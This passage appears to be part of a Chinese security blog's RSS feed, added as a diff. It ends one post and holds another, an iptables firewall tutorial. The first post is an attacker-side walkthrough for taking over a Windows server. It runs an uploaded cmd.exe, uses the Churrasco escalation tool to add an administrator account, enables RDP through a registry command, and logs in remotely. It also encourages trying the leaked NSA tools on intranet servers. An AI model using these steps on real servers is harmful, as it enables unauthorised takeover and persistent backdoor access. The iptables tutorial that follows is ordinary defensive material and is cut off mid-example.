+&lt;p&gt;&lt;img src=&#34;v2-6c9679f163c06cb6d6a73a7aa38f17de_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;v2-7a965148c3cbc5a7bc19695203fac9e8_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;======================================================================&lt;/p&gt;
+&lt;p&gt;由于后来没找到Windows服务器的网站模板，因此下面就不带图了，过程全部手打还原，谅解&lt;/p&gt;
+&lt;p&gt;======================================================================&lt;/p&gt;
+&lt;p&gt;先将终端路径设置为我们自己上传的cmd.exe&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;SETP ../../www/uploads/cmd.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再用巴西烤肉强制执行命令。巴西烤肉语法：Churrasco.exe &amp;ldquo;your command&amp;rdquo;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Chu.exe &amp;#34;net user [username] [password] /add &amp;amp; net localgroup Administrators [username] /add&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;若无报错，那么我们就已经成为系统管理员账户了。查看当前用户会发现我们创建的用户：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;net user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;至此，我们已经创建了超级权限的用户，已经可以对整个服务器进行操作了。但是在终端里操作总有些不方便，下面我们介绍一下拿下权限后如何远程连接进行桌面操作。&lt;/p&gt;
+&lt;h2 id=&#34;0x03-3389端口服务&#34;&gt;0x03 3389端口服务&lt;/h2&gt;
+&lt;p&gt;远程桌面协议（RDP, Remote Desktop Protocol）是一个多通道（multi-channel）的协议，让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。大部分的Windows都有客户端所需软件。服务端电脑方面，&lt;strong&gt;默认听取送到TCP3389端口的数据&lt;/strong&gt;。【百度百科】&lt;/p&gt;
+&lt;p&gt;这是一种非常方便的对服务器的操作方式，一般的网站管理员都会开启3389端口远程桌面服务。而有的安全素养比较高的管理员则会选择将3389端口关闭，甚至开启防火墙禁止任何开启3389的操作。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;闲扯一下，最近Shadow Broker泄露的NSA的工具，内网里开3389的服务器一打一个准，有空的可以去玩玩。misterch0c/shadowbroker&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;在无防火墙的情况下，我们可以用cmd命令来添加注册表开启3389端口，或者使用别人留下的工具。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;cmd命令&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;将以下命令写入一个.bat文件，将其拖入服务器可读写目录执行，即可开启3389端口。&lt;/p&gt;
+&lt;p&gt;此种对Windows XP 和2003系统有用，不用重起&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&amp;#34; &amp;#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;写好的程序&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;v2-c1f967bb47989b9824e01b78f35b8281_hd.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Chu.exe &amp;#34;kai3389.exe&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;就行了&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;在有防火墙的情况下，需将防火墙先关闭，再用lcx.exe将3389映射到其他端口上，这个等我搞懂了再写。&lt;/em&gt;&lt;/p&gt;
+&lt;h2 id=&#34;0x04-rdp远程桌面连接&#34;&gt;0x04 RDP远程桌面连接&lt;/h2&gt;
+&lt;p&gt;创建好用户，开启远程桌面功能，就可以用此用户远程登陆别人的服务器直接进行桌面操作，岂不是美滋滋。&lt;/p&gt;
+&lt;p&gt;Win+R 打开【运行】窗口，运行&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;mstsc /admin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用直接创建的用户名和密码登录，OK。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>iptables防火墙的应用和SNAT/DNAT策略</title>
+      <link>https://p0st3r.github.io/post/iptables/</link>
+      <pubDate>Wed, 12 Apr 2017 00:00:00 +0000</pubDate>
+      <guid>https://p0st3r.github.io/post/iptables/</guid>
+      <description>&lt;h1 id=&#34;0x00-iptables简介&#34;&gt;0x00 iptables简介&lt;/h1&gt;
+&lt;p&gt;netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案。&lt;/p&gt;
+&lt;p&gt;Linux防火墙体系主要工作在网络层，针对TCP/IP数据包实施过滤和限制，完成封包过滤、封包重定向和网络地址转换（NAT）等功能，属于典型的包过滤防火墙（也称网络层防火墙）。其基于内核编码实现，具有非常稳定的性能和高效率，因此被广泛的应用。&lt;/p&gt;
+&lt;h2 id=&#34;1-netfilter和iptables的区别&#34;&gt;1. Netfilter和iptables的区别：&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Netfilter:指的是Linux内核中实现包过滤防火墙的内部结构，不以程序或文件的形式存在，属于“内核态”（KernelSpace，又称内核空间）的防火墙功能体系；&lt;/li&gt;
+&lt;li&gt;Iptables：指的是用来管理Linux防火墙的命令程序，通常位于/sbin/iptables，属于“用户态”（UserSpace，又称用户空间）的防火墙管理体系；&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以其实iptables只是Linux防火墙的管理工具而已，位于/sbin/iptables。真正实现防火墙功能的是 netfilter，它是Linux内核中实现包过滤的内部结构。&lt;/p&gt;
+&lt;h2 id=&#34;2-规则rules&#34;&gt;2. 规则（rules)&lt;/h2&gt;
+&lt;p&gt;规则（rules）其实就是网络管理员预定义的条件，规则一般的定义为“如果数据包头符合这样的条件，就这样处理这个数据包”。&lt;/p&gt;
+&lt;p&gt;规则存储在内核空间的信息 包过滤表中，这些规则分别指定了&lt;strong&gt;源地址&lt;/strong&gt;、&lt;strong&gt;目的地址&lt;/strong&gt;、&lt;strong&gt;传输协议&lt;/strong&gt;（如TCP、UDP、ICMP）和&lt;strong&gt;服务类型&lt;/strong&gt;（如HTTP、FTP和SMTP）等。当数据包与规则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如&lt;strong&gt;放行（accept）&lt;/strong&gt;、**拒绝（reject）&lt;strong&gt;和&lt;/strong&gt;丢弃（drop）**等。&lt;/p&gt;
+&lt;p&gt;配置防火墙的主要工作就是添加、修改和删除这些规则。&lt;/p&gt;
+&lt;h2 id=&#34;3-包过滤的工作层次&#34;&gt;3. 包过滤的工作层次：&lt;/h2&gt;
+&lt;p&gt;主要是网络层，针对IP数据包。体现在对包内的IP地址、端口等信息的处理上。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic3.zhimg.com/80/v2-ac1c43e4005e585e8b039f6d0f654d76_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-iptables的表链结构&#34;&gt;3. iptables的表、链结构：&lt;/h2&gt;
+&lt;p&gt;iptables作用：为包过滤机制的实现提供规则（或策略），通过各种不同的规则，告诉netfilter对来自某些源、前往某些目的或具有某些协议特征的数据包应该如何处理。&lt;/p&gt;
+&lt;p&gt;iptables内置了4个表，即&lt;strong&gt;filter&lt;/strong&gt;表、&lt;strong&gt;nat&lt;/strong&gt;表、&lt;strong&gt;mangle&lt;/strong&gt;表和&lt;strong&gt;raw表&lt;/strong&gt;，分别用于实现&lt;strong&gt;包过滤&lt;/strong&gt;，&lt;strong&gt;网络地址转换&lt;/strong&gt;、&lt;strong&gt;包重构(修改)&lt;strong&gt;和&lt;/strong&gt;数据跟踪处理&lt;/strong&gt;。 链（chains）是数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一 条或数条规则。&lt;/p&gt;
+&lt;p&gt;当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，看该数据包是否满足规则所定义的条件。如果满足，系统就会根据 该条规则所定义的方法处理该数据包；否则iptables将继续检查下一条规则，如果该数据包不符合链中任一条规则，iptables就会根据该链预先定 义的默认策略来处理数据包。&lt;/p&gt;
+&lt;h3 id=&#34;规则链&#34;&gt;规则链：&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;规则的作用：对数据包进行过滤或处理&lt;/li&gt;
+&lt;li&gt;链的作用：容纳各种防火墙规则&lt;/li&gt;
+&lt;li&gt;链的分类依据：处理数据包的不同时机&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;默认包括5种规则链&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;INPUT：处理入站数据包&lt;/li&gt;
+&lt;li&gt;OUTPUT：处理出站数据包&lt;/li&gt;
+&lt;li&gt;FORWARD：处理转发数据包&lt;/li&gt;
+&lt;li&gt;POSTROUTING链：在进行路由选择后处理数据包（对数据链进行源地址修改转换）&lt;/li&gt;
+&lt;li&gt;PREROUTING链：在进行路由选择前处理数据包（做目标地址转换）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;INPUT&lt;/strong&gt;、&lt;strong&gt;OUTPUT&lt;/strong&gt;链主要用在“主机型防火墙”中，即主要针对服务器本机进行保护的防火墙；而&lt;strong&gt;FORWARD&lt;/strong&gt;、&lt;strong&gt;PREROUTING=&lt;/strong&gt;、&lt;strong&gt;POSTROUTING&lt;/strong&gt;链多用在“网络型防火墙”中。&lt;/p&gt;
+&lt;h3 id=&#34;规则表&#34;&gt;规则表&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;表的作用：容纳各种规则链&lt;/li&gt;
+&lt;li&gt;表的划分依据：防火墙规则的作用相似&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;默认包括4个规则表：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;raw表：确定是否对该数据包进行状态跟踪；对应iptable_raw，表内包含两个链：OUTPUT、PREROUTING&lt;/li&gt;
+&lt;li&gt;mangle表：为数据包的TOS（服务类型）、TTL（生命周期）值，或者为数据包设置Mark标记，以实现流量整形、策略路由等高级应用。其对应iptable_mangle，表内包含五个链：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD&lt;/li&gt;
+&lt;li&gt;nat表：修改数据包中的源、目标IP地址或端口；其对应的模块为iptable_nat，表内包括三个链：PREROUTING、POSTROUTING、OUTPUT&lt;/li&gt;
+&lt;li&gt;filter表：确定是否放行该数据包（过滤）；其对应的内核模块为iptable_filter，表内包含三个链：INPUT、FORWARD、OUTPUT&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://pic1.zhimg.com/80/v2-3716f456bd27f19d2b71c522b7e4a7d4_720w.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Iptables采用“表”和“链”的分层结构。注意一定要明白这些表和链的关系及作用。&lt;/p&gt;
+&lt;h2 id=&#34;4-链表的优先顺序&#34;&gt;4. 链、表的优先顺序&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;规则表之间的优先顺序&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;Raw==》mangle==》nat==》filter&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;规则链之间的顺序&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;入站：PREROUTING==》INPUT&lt;/li&gt;
+&lt;li&gt;出站：OUTPUT==》POSTROUTING&lt;/li&gt;
+&lt;li&gt;转发：PREROUTING==》FORWARD==》POSTROUTIN&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;规则链内的匹配顺序&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;按顺序依次检查，&lt;strong&gt;匹配即停止&lt;/strong&gt;（LOG策略例外）&lt;/li&gt;
+&lt;li&gt;若找不到相匹配的规则，则按该链的默认策略处理&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&#34;0x01-编写防火墙规则&#34;&gt;0x01 编写防火墙规则&lt;/h1&gt;
+&lt;h2 id=&#34;1-iptables-的基本语法控制类型&#34;&gt;1. iptables &lt;strong&gt;的基本语法、控制类型&lt;/strong&gt;&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;iptables [ -t 表名] 选项 [链名] [条件] [ -j 控制类型] 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注意事项：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;不指定表名时，-t 默认指filter表&lt;/li&gt;
+&lt;li&gt;不指定链名时，默认指表内的所有链&lt;/li&gt;
+&lt;li&gt;除非设置链的默认策略，否则必须指定匹配条件&lt;/li&gt;
+&lt;li&gt;选项、链名、控制类型使用大写字母，其余均为小写&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;2-数据包的常见控制类型&#34;&gt;2. 数据包的常见控制类型&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;ACCEPT：允许通过&lt;/li&gt;
+&lt;li&gt;DROP：直接丢弃，不给出任何回应&lt;/li&gt;
+&lt;li&gt;REJECT：拒绝通过，必要时会给出提示&lt;/li&gt;
+&lt;li&gt;LOG：在/var/log/messages文件中记录日志信息，然后传给下一条规则继续匹配（匹配即停止对LOG操作不起作用，因为LOG只是一种辅助动作，并没有真正的处理数据包）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;3-iptables命令的管理控制选项&#34;&gt;3. iptables命令的管理控制选项&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;-A 在指定链的末尾添加（append）一条新的规则 -D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除&lt;/li&gt;
+&lt;li&gt;-I 在指定链中插入（insert）一条新的规则，默认在第一行添加-R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换&lt;/li&gt;
+&lt;li&gt;-L 列出（list）指定链中所有的规则进行查看&lt;/li&gt;
+&lt;li&gt;-E 重命名用户定义的链，不改变链本身&lt;/li&gt;
+&lt;li&gt;-F 清空（flush）&lt;/li&gt;
+&lt;li&gt;-N 新建（new-chain）一条用户自己定义的规则链&lt;/li&gt;
+&lt;li&gt;-X 删除指定表中用户自定义的规则链（delete-chain）&lt;/li&gt;
+&lt;li&gt;-P 设置指定链的默认策略（policy）&lt;/li&gt;
+&lt;li&gt;-Z 将所有表的所有链的字节和数据包计数器清零&lt;/li&gt;
+&lt;li&gt;-n 使用数字形式（numeric）显示输出结果&lt;/li&gt;
+&lt;li&gt;-v：以更详细的方式显示规则信息&lt;/li&gt;
+&lt;li&gt;&amp;ndash;line-numbers：查看规则时，显示规则的序号-X：删除自定义的规则链 &lt;strong&gt;eg：将filter表中FORWARD链中的默认策略设为丢弃，OUTPUT链的默认策略设为允许&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;4-规则的匹配条件&#34;&gt;4. 规则的匹配条件&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;通用匹配&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;协议匹配: -p [协议名]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;地址匹配&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;-s [源地址]&lt;/li&gt;
+&lt;li&gt;-d [目标地址]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;接口匹配&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;-i [入站网卡]&lt;/li&gt;
+&lt;li&gt;-o [出站网卡]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;隐含匹配&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;端口匹配&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;-sport [源端口]&lt;/li&gt;
+&lt;li&gt;-dport [目标端口]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;TCP标记匹配：&amp;ndash;tcp-flags [检查范围] [被设置的标记]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;ICMP类型匹配：&amp;ndash;icmp-type [ICMP类型]&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;显式匹配&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;多端口匹配：-m multiport &amp;ndash;sport | &amp;ndash;dport [端口列表]&lt;/li&gt;
+&lt;li&gt;IP范围匹配：-m iprange &amp;ndash;src-range [IP范围]&lt;/li&gt;
+&lt;li&gt;MAC地址匹配：-m mac &amp;ndash;mac-range [MAC地址]&lt;/li&gt;
+&lt;li&gt;状态匹配：-m state &amp;ndash;state [连接状态]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;常见通用匹配条件&#34;&gt;常见通用匹配条件：&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;协议匹配：-p [协议名]&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;（eg：&lt;strong&gt;tcp&lt;/strong&gt;、&lt;strong&gt;udp&lt;/strong&gt;、&lt;strong&gt;icmp&lt;/strong&gt;、&lt;strong&gt;all&lt;/strong&gt;(针对所有IP数据包)），可用的协议类型存放于Linux系统的/etc/procotols文件中；&lt;/p&gt;
+&lt;p&gt;eg：丢弃通过icmp协议访问防火墙本机的数据包、允许转发经过防火墙的除icmp协议以外的数据包：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;[root@iptables ~]# iptables -I INPUT -p icmp -j DROP
+[root@iptables ~]# iptables -A FORWARD -p ! icmp -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;【！】表示取反&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2. 地址匹配：-s [源地址]、 -d [目标地址]&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;可以是IP地址、网段地址，但不建议使用主机名、域名地址，因为解析过程会影响效率&lt;/p&gt;
+&lt;p&gt;eg：拒绝转发源地址为192.168.10.100的数据、允许转发源地址位于192.168.1.0/24网段的数据：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[root@iptables ~]# iptables -A FORWARD -s 192.168.10.100 -j REJECT [root@iptables ~]# iptables -A FORWARD -s 192.168.1.0/24 -j ACCEPT 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当遇到小规模的网络扫描或攻击时，封IP地址是比较有效的方式。&lt;/p&gt;
+&lt;p&gt;eg：添加防火墙规则封锁来自172.16.16.0/24网段的频繁扫描、登录穷举等不良企图：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;[root@iptables ~]# iptables -I INPUT -s 172.16.16.0/24 -j DROP [root@iptables ~]# iptables -I FORWARD -s 172.16.16.0/24 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;3. 接口匹配&lt;/strong&gt;：&lt;strong&gt;-i [入站网卡]、-o [出站网卡]&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;eg：丢弃从外网接口eth0访问防火墙本机且源地址为私有地址的数据包：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;[root@iptables ~]# iptables -A INPUT -i eth0 -s 172.16.0.0/12 -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;常用隐含匹配条件&#34;&gt;常用隐含匹配条件：&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;1. 端口匹配&lt;/strong&gt;：&lt;strong&gt;&amp;ndash;sport [源端口]、&amp;ndash;dport [目的端口]&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;单个端口号或者以冒号“：”分隔的端口范围都是可以接受的，但不连续的多个端口不能采用这种方式。&lt;/p&gt;
+&lt;p&gt;eg：允许为网段192.168.1.0/24转发DNS查询数据包：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[root@iptables ~]# iptables -A FORWARD -s 192.168.1.0/24 -p udp --dport 53 -j ACCEPT [root@iptables ~]# iptables -A FORWARD -d 192.168.1.0/24 -p udp --sport 53 -j ACCEPT&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;eg：构建vsftpd服务器时，开放20、21端口，以及用于被动模式的端口范围24500~24600：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[root@iptables ~]# iptables -A INPUT -p tcp --dport 20:21 -j ACCEPT [root@iptables ~]# iptables -A INPUT -p tcp --dport 24500:24600 -j ACCEPT&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2. TCP标记匹配&lt;/strong&gt;：&lt;strong&gt;&amp;ndash;tcp-flags 检查范围 被设置的标记&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;针对协议为TCP、用来检查数据包的标记位（&amp;ndash;tcp-flags）&lt;/p&gt;
+&lt;p&gt;“检查范围”指出需要检查数据包的哪几个标记，“被设置的标记”则明确匹配对应值为1的标记，多个标记之间以逗号进行分隔。&lt;/p&gt;
+&lt;p&gt;eg：拒绝从外网接口eth0直接访问防火墙本机的TCP请求，但允许其他主机发给防火墙的TCP等响应数据包请求：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[root@iptables ~]# iptables -P INPUT DROP [root@iptables ~]# iptables -I INPUT -i eth0 -p tcp --tcp-flags SYN,RST,ACK SYN -j DROP [root@iptables ~]# iptables -I INPUT -i eth0 -p tcp --tcp-flags ! --syn -j ACCEPT&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;3. ICMP类型匹配&lt;/strong&gt;：&lt;strong&gt;&amp;ndash;icmp-type ICMP类型&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;ICMP类型使用字符串或数字代码表示：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Echo-Request代码为8——表ICMP请求；&lt;/li&gt;
+&lt;li&gt;Echo-Reply代码为0——ICMP回显；&lt;/li&gt;
+&lt;li&gt;Destination-Unreachable代码为3——ICMP目标不可达；&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;eg：禁止从其他主机ping本机，但是允许本机ping其他主机：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;[root@iptables ~]# iptables -A INPUT -p icmp --icmp-type 8 -j DROP [root@iptables ~]# iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT [root@iptables ~]# iptables -A INPUT -p icmp --icmp-type 3 -j ACCEPT [root@iptables ~]# iptables -A INPUT -p icmp -j DROP &lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;常用的显式匹配条件&#34;&gt;常用的显式匹配条件&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;1. 多端口匹配&lt;/strong&gt;：&lt;strong&gt;-m multiport &amp;ndash;sports [源端口列表]&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;-m multiport &amp;ndash;dports [目的端口列表]&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;eg：允许本机开放25、80、110、143端口，以便提供电子邮件服务：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;[root@iptables ~]# iptables -A INPUT -p tcp -m multiport --dport 25,80,110,143 -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;2. IP范围匹配&lt;/strong&gt;：&lt;strong&gt;-m iprange &amp;ndash;src-range [IP范围]&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;用来检查数据包的源地址、目标地址，其中IP范围采用“起始地址—结束地址”的形式：&lt;/p&gt;
+&lt;p&gt;eg：禁止转发源IP地址位于192.168.1.10与192.168.1.20之间的TCP数据包：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;[root@iptables ~]# iptables -A FORWARD -p tcp -m iprange --src-range 192.168.1.10-192.168.1.20 -j ACCEPT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;3. MAC地址匹配&lt;/strong&gt;：&lt;strong&gt;-m mac &amp;ndash;mac-source [MAC地址]&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;因为MAC地址的局限性，此类匹配一般只适用于内部网络。&lt;/p&gt;
+&lt;p&gt;eg：根据MAC地址封锁主机，禁止其访问本机的任何应用：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;[root@iptables ~]# iptables -A INPUT -m mac --mac-source 00:01:02:03:04:cc -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;4. 状态匹配&lt;/strong&gt;：&lt;strong&gt;-m state &amp;ndash;state [连接状态]&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;基于iptables的状态跟踪机制用来检查数据包的连接状态（State）&lt;/li&gt;
+&lt;li&gt;常见的连接状态包括NEW（与任何连接无关的）、ESTABLISHED（响应请求或者已建立连接的）、RELATED（与已有连接有相关性的，eg：FTP数据连接）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;eg：禁止转发与正常TCP连接无关的非“&amp;ndash;syn”请求数据包（如伪造的一些网络攻击数据包）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;[root@iptables ~]# iptables -A FORWARD -m state --state NEW -p tcp ! --syn -j DROP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg：只开放本机的web服务（80端口），但对发给本机的TCP应答数据包予以放行，其他入站数据包均丢弃：&lt;/p&gt;
